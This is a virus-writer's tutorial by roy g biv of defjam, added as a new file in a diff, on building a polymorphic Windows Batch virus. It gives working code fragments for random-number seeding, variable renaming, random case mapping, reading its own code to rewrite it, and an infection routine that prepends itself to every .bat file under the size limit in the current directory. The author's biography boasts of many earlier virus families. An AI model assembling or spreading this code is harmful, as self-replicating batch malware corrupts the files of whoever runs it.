@@ -1,0 +1,394 @@
+                              Polymorphic  Batch
+                              roy g biv / defjam
+
+                                 -= defjam =-
+                                  since 1992
+                     bringing you the viruses of tomorrow
+                                    today!
+
+
+About the author:
+
+Former  DOS/Win16  virus writer, author of several virus  families,  including
+Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
+sources  ;),  and Virus Bulletin 9/95 for a description of what   they  called
+Rainbow.   Co-author  of  world's first virus using circular  partition  trick
+(Orsam, coded with Prototype in 1993).  Designer of world's first XMS swapping
+virus  (John Galt, coded by RT Fishel in 1995, only 30 bytes stub, the rest is
+swapped  out).   Author of world's first virus using Thread Local Storage  for
+replication  (Shrug, see Virus Bulletin 6/02 for a description, but they  call
+it Chiton), world's first virus using Visual Basic 5/6 language extensions for
+replication  (OU812), world's first Native executable virus (Chthon),  world's
+first  virus  using process co-operation to prevent termination  (Gemini,  see
+Virus  Bulletin 9/02 for a description), world's first virus using polymorphic
+SMTP  headers (JunkMail, see Virus Bulletin 11/02 for a description),  world's
+first viruses that can convert any data files to infectable objects (Pretext),
+world's  first  32/64-bit  parasitic  EPO .NET  virus  (Croissant,  see  Virus
+Bulletin  11/04  for a description, but they call it Impanate), world's  first
+virus  using  self-executing HTML (JunkHTMaiL, see Virus Bulletin 7/03  for  a
+description), world's first virus for Win64 on Intel Itanium (Shrug, see Virus
+Bulletin 6/04 for a description, but they call it Rugrat), world's first virus
+for  Win64 on AMD AMD64 (Shrug), world's first cross-infecting virus for Intel
+IA32  and  AMD  AMD64  (Shrug),  world's  first  viruses  that  infect  Office
+applications  and  script  files  using the same  code  (Macaroni,  see  Virus
+Bulletin  11/05  for  a description, but they call it Macar),  world's   first
+viruses  that  can infect both VBS and JScript using the same code (ACDC,  see
+Virus  Bulletin 11/05 for a description, but they call it Cada), world's first
+virus  that  can  infect  CHM files (Charm, see Virus  Bulletin  10/06  for  a
+description,  but they call it Chamb), world's first IDA plugin virus  (Hidan,
+see Virus Bulletin 3/07 for a description), world's first viruses that use the
+Microsoft  Script  Encoder  to dynamically encrypt the  virus  body  (Screed),
+world's  first virus for StarOffice and OpenOffice (Starbucks), world's  first
+virus  IDC  virus (ID10TiC), world's first polymorphic virus for Win64 on  AMD
+AMD64  (Boundary, see Virus Bulletin 12/06 for a description, but they call it
+Bounds),  world's first virus that can infect Intel-format and  PowerPC-format
+Mach-O  files  (MachoMan,  see  Virus Bulletin 1/07  for  a  description,  but
+they  call  it  Macarena), world's first virus that uses  Unicode  escapes  to
+dynamically  encrypt  the virus body (Unicycle), world's first  self-executing
+PIF  (Spiffy), world's first self-executing LNK (WeakLNK), world's first virus
+that uses virtual code (Relock, see Virus Bulletin 3/10 for a description, but
+they  call  it  Lerock),  world's first virus to  use  FSAVE  for  instruction
+reordering (Mimix, see Virus Bulletin 1/10 for a description, but they call it
+Fooper), world's first virus for ODbgScript (Volly), world's first Hiew plugin
+virus  (Hiewg),  world's first virus that uses fake BOMs (Bombastic),  world's
+first  virus  that  uses JScript prototypes to run itself  (Protato),  world's
+first  virus  that  uses  Heaven's Gate for  replication  (Heaven,  see  Virus
+Bulletin 12/11 for a description, but they call it Sobelow), and world's first
+virus  for  010 Editor script (To_Be).  Author of various retrovirus  articles
+(eg  see  Vlad  #7 for the strings that make your code invisible  to  TBScan).
+This  is my first virus for Batch.  It is the world's first truly  polymorphic
+Batch virus.
+
+
+What is it?
+
+Everyone knows about batch files.  Lots of very poor viruses have been written
+using  it.   Some  of those viruses are even  "encrypted",  using  environment
+variable tricks (simple text substitution).  A few of them can change parts of
+their  code  using specially marked lines, find.exe, and  output  redirection.
+There has never been a truly polymorphic one... until now.
+
+
+The language
+
+With  the  introduction of Windows XP, many things became possible  that  were
+impossible previously.  Suddenly, we can access substrings, perform search and
+replace,  perform  arithmetic,  and create complex loops.   We  can  construct
+random  numbers,  we  can map case randomly, we can change variable  names  to
+random strings.  Yes, now we can do the same things that script viruses do.
+
+
+Limitations
+
+The  batch  language  is clearly not intended to be  a  programming  language.
+There  are many strange behaviours that are difficult to understand, including
+some things that are not consistent.
+
+
+Special characters
+
+Certain  characters  require prepending a "^", otherwise they  disappear.   In
+some cases, more than one "^" is required.  Examples: ! ) ^
+The "%" requires doubling in order to preserve it.
+
+
+Subroutines
+
+Further  parsing  occurs when passing a line to a subroutine.   Example:  "%%"
+becomes "%".  Operators are not passed to subroutines, making it impossible to
+use a subroutine to examine a line.
+
+
+Echo
+
+Echo  always  emits a crlf sequence so there is no way to append to same  line
+using it.  It is possible to work around this by using a nul redirection.
+
+
+Tokenising
+
+Blank  lines and spaces are removed by tokeniser.  Spaces are considered to be
+token delimiters by default, even inside quotes in "rem" statements.
+
+
+Rem
+
+The  "rem" can be after anything except "endif" (single ")" on a line), "set",
+and "setlocal".  These are fun undocumented behaviours.
+
+
+Goto
+
+We  cannot use "goto" to a label inside a nested "for" loop, becaues it causes
+the outer loop to exit on next iteration.
+
+
+If
+
+If  a ":" appears on the right side of an "if", it causes the operator and the
+":"  to disappear, resulting in corrupted statements.  A "rem" in an "if" that
+also  contains ":~" causes the operator and the ":~" to disappear, and  tokens
+to  be  concatenated, resulting in corrupted statements.   A  delayed-expanded
+variable  that  is  compared to a delayed-expanded variable  also  causes  the
+operator  to  disappear and tokens to be concatenated, resulting in  corrupted
+statements.
+
+
+Labels
+
+We  cannot  place  labels inside a "for" loop (even if not used),  because  it
+causes  a mismatched parenthesis error.  We cannot place a blank line after  a
+label, because execution stops with an error.
+
+
+Others?
+
+Probably.  After a while, I stopped trying to work out the causes.
+
+
+RNG Seeding
+
+We can seed a random number generator by using the current time.  We write the
+time to a file, and then tokenise the file to read it back.  Then we can use a
+substring to get the number of minutes, and assign the value to an environment
+variable.  It looks like this:
+
+    rem write current time to file "rb"
+    time /t > rb
+    rem read file into local variable "%%a"
+    rem any "AM" or "PM" part will be in "%%b"
+    for /f "tokens=*" %%a in (rb) do (
+        assign %%a to environment variable "_seed"
+        set _seed=%%a
+    )
+    rem extract minutes (2 characters starting at position 3)
+    rem requires "hh:mm" format, but you can change it how you need
+    rem assign result to environment variable "_seed"
+    set _seed=!_seed:~3,2!
+
+
+RNG iterating
+
+Now  we  have our seed, we can produce more random numbers using  arithmentic.
+Here is our random number subroutine:
+
+:rnd
+    set /a _seed *= 0x343fd
+    set /a _seed += 0x269ec3
+    set /a _seed = "_seed&0x7fffffff"
+    set /a _val1 = "_seed>>16"
+    goto :eof
+
+Environment  variable  "_seed" is updated each time, and result is  placed  in
+environment variable "_val1".
+
+
+Variable renaming
+
+We  can  change our variable names very easily.  We place each one of the  old
+names  in  environment  variables.   We place each one of  the  new  names  in
+environment  variables.  Then for each old name, we use search and replace  on
+each  new  name.  When we write out the lines of code, the new names  will  be
+written.
+
+Here is the set of old names:
+
+    set _nameo1=_seed
+    set _nameo2=_nameo
+    set _nameo3=_namen
+    set _nameo4=_alpha
+...
+
+The array of old names should include the base name of the variable that holds
+the  old names and also the new names.  If you don't have too many  variables,
+then  you  can use a single variable that holds all names, and replace in  one
+pass using  a loop with delimiters instead.
+
+Here is the code to construct new names:
+
+    for /l %%a in (1, 1, 39) do (
+        set _out=
+        call :randstr
+        set _namen%%a=!_out!
+    )
+
+Here is the code to replace the names:
+
+    for /l %%$ in (1, 1, 39) do (
+        set _atok=!_nameo%%$!
+        set _btok=!_namen%%$!
+        call :repvar !_atok! !_btok!
+    )
+
+    rem echo/ protects against blank lines causing "echo is off" message
+    echo/ !_out!>> rc
+
+rem replacement must be done using subroutine
+rem else variable corruption occurs
+rem "_out" holds a line of code
+:repvar
+    set _out=!_out:%1=%2!
+    goto :eof
+
+
+Random case
+
+We  can  map  the case randomly.  Almost all labels and tokens can  be  mapped
+randomly.   There  are  some exceptions, such as loops, and the  parameter  to
+"setlocal".  These are  case-sensitive and cannot be changed.
+
+To map the case, we need a variable that holds all of the letters, both upper-
+case and lowercase.  It looks like this:
+
+    set _alpha=abcdefghijklmnopqrstuvwxyzrgbrgbABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+Here  the first alphabet is extended to 32 bytes each so that we can use &  63
+and  index  directly with no conditional instructions to check the range.   To
+choose a random character, we can do this:
+
+    call :rnd
+    set /a _val1 = "_val1&63"
+    set _out=!_alpha:~%_val1%,1!
+
+If  the second alphabet is not 32 bytes long, then an out-of-bounds index will
+return an empty character.  That can be useful for other things.
+
+
+Random space
+
+Since  the  space  character is discarded during tokenising, even  from  "set"
+instructions, we have to take special action to emit it.  We can place it in a
+environment  variable  and it will be assigned properly.  However, we have  to
+use  the  environment variable in order to access it.  We cannot write  spaces
+directly.
+
+
+Self-tokenising
+
+This is all useless if we can't write our modified code to a new file.  We can
+read  our code using a loop, one line at a time to a temporary file (and  stop
+reading  when we see the host code).  We can read the line back one token at a
+time.  We can examine the tokens, modify the tokens, and then write the result
+to another temporary file.  Then we can attach that file to other files.  Here
+is how we read our code one line at a time:
+
+    rem allow create first temporary file
+    del rb
+    rem tokenise file "%0", each line is stored in local variable "%%a"
+    for /f "tokens=*" %%a in ( %~nx0 ) do (
+        rem write each line to temporary file
+        rem it might be possible to work with a single line at a time
+        rem but I did not succeed with that, so I need whole file first
+        echo/ %%a>> rb
+
+        rem watch for start of host code
+        rem marker can be anything, here last 4 characters are checked
+        set _xtok=%%a
+        if /i "!_xtok:~-4!" == "host" (
+            goto :parse
+        )
+    )
+
+Here is how we read the line back one token at a time:
+
+:parse
+    rem allow create second temporary file
+    del rc
+
+    rem read the line from file "rb"
+    for /f "tokens=*" %%# in (rb) do (
+        rem split into tokens "%%a", "%%b", "%%c" ... "%%z"
+        for /f "tokens=1-26" %%a in ( "%%#" ) do (
+            set _atok=%%a
+
+            if /i "!_atok!" == "echo" (
+
+and  so  on.  We must parse the tokens in order to modify them.  This  is  the
+hardest part of the code, and also makes the code very large.
+
+
+Missing tokens
+
+Since  tokenising  the line causes some things to disappear, we need a way  to
+reconstruct  the line.  I used a special "rem" line for this, which  describes
+how  the  line was supposed to look.  When the parser sees the  special  "rem"
+line, it builds the line again and writes that instead.  It looks like this:
+
+    rem _#x_seed#c~3,2#x
+
+produces "!_seed:~3,2!".  Or this:
+
+    rem _#x_nameo#p#pa#c~0,1#x#x_out#x
+
+produces "!_nameo%%a:~0,1!!_out!".  How about this:
+
+    rem _#x_out#x#t#t#x#x_prev2#x#t#t#x#x_btok#c~-2#x
+
+produces "!_out!^^!!_prev2!^^!!_btok:~-2!". :)
+
+
+File size
+
+Since the resulting file will be very large, and since batch files are limited
+to 64kb in size, we must check the size before attempting to infect.
+
+    rem find the file named "rc"
+    for %%a in (rc) do (
+        rem place file size in environment variable "_s1".
+        set _s1=%%~za
+    )
+
+    rem find all batch files in the current directory
+    for %%a in (*.bat) do (
+        rem place each file size in environment variable "_s2".
+        set _s2=%%~za
+        rem sum the sizes
+        set /a _s2 += _s1
+
+        rem check result for less than 60000
+        if "!_s2!" lss "60000" (
+            set _atok=%%a
+            rem infect it
+            call :inf !_atok!
+        )
+    )
+
+    goto :eof
+
+:inf
+    rem read a line from the target file
+    for /f "tokens=*" %%b in ( %1 ) do (
+        set _atok=%%b
+
+        rem check for infection marker
+        rem 2 characters starting at position 1
+        rem here marker is first line is "if"
+        if /i "!_atok:~1,2!" neq "if" (
+            rem rename host to temporary name
+            ren %1 rb
+            rem prepend us to original filename
+            rem cannot prepend to existing file
+            rem because file will be overwritten instead
+            copy rc + rb %1
+            del rb
+        )
+
+        rem break loop after one line
+        goto :eof
+    )
+
+
+All done
+
+Once we put all of that together, we have something like BAT.Polymer. :)
+
+
+Greets to friendly people (A-Z):
+
+Active - Benny - herm1t - hh86 - jqwerty - Malum - Obleak - Prototype -
+Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras -
+uNdErX - Vallez - Vecna - Whitehead
+
+
+rgb/defjam dec 2011
+iam_rgb@hotmail.com
